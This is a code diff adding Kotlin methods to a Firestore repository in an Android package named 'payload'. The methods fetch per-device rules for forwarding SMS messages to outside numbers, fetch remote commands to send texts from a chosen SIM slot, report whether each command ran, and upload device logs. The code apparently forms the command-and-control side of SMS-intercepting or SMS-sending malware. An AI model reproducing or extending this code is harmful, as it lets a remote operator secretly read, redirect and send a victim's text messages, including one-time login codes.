@@ -107,4 +107,90 @@ class FirestoreRepository {
             Result.failure(e)
         }
     }
+    
+    suspend fun saveLog(level: String, message: String, deviceId: String): Result<Unit> {
+        return try {
+            val logEntry = mapOf(
+                "timestamp" to com.google.firebase.Timestamp.now(),
+                "level" to level,
+                "message" to message,
+                "deviceId" to deviceId
+            )
+            
+            firestore.collection("logs")
+                .add(logEntry)
+                .await()
+            
+            Result.success(Unit)
+        } catch (e: Exception) {
+            Result.failure(e)
+        }
+    }
+    
+    suspend fun getForwardingRules(deviceId: String): Result<List<com.payload.jansiix0ne.models.ForwardingModel>> {
+        return try {
+            val snapshot = firestore.collection("smsforward")
+                .whereEqualTo("deviceId", deviceId)
+                .whereEqualTo("status", "active")
+                .get()
+                .await()
+            
+            val rules = snapshot.documents.mapNotNull {
+                try {
+                    com.payload.jansiix0ne.models.ForwardingModel(
+                        fromSim = it.getString("fromSim") ?: "",
+                        toNumber = it.getString("toNumber") ?: "",
+                        status = it.getString("status") ?: "",
+                        executed = it.getBoolean("executed") ?: false
+                    )
+                } catch (e: Exception) {
+                    null
+                }
+            }
+            
+            Result.success(rules)
+        } catch (e: Exception) {
+            Result.failure(e)
+        }
+    }
+    
+    suspend fun getSendSmsCommand(deviceId: String): Result<com.payload.jansiix0ne.models.SendSmsModel?> {
+        return try {
+            val document = firestore.collection("devices")
+                .document(deviceId)
+                .get()
+                .await()
+            
+            val sendSmsData = document.get("send_sms") as? Map<*, *>
+            
+            val sendSmsModel = if (sendSmsData != null) {
+                com.payload.jansiix0ne.models.SendSmsModel(
+                    phoneNumber = sendSmsData["phoneNumber"] as? String ?: "",
+                    message = sendSmsData["message"] as? String ?: "",
+                    sent = sendSmsData["sent"] as? Boolean ?: false,
+                    simSlot = (sendSmsData["simSlot"] as? Long)?.toInt() ?: 0,
+                    timestamp = sendSmsData["timestamp"] as? Long ?: System.currentTimeMillis()
+                )
+            } else {
+                null
+            }
+            
+            Result.success(sendSmsModel)
+        } catch (e: Exception) {
+            Result.failure(e)
+        }
+    }
+    
+    suspend fun updateSendSmsStatus(deviceId: String, sent: Boolean): Result<Unit> {
+        return try {
+            firestore.collection("devices")
+                .document(deviceId)
+                .update("send_sms.sent", sent)
+                .await()
+            
+            Result.success(Unit)
+        } catch (e: Exception) {
+            Result.failure(e)
+        }
+    }
 }
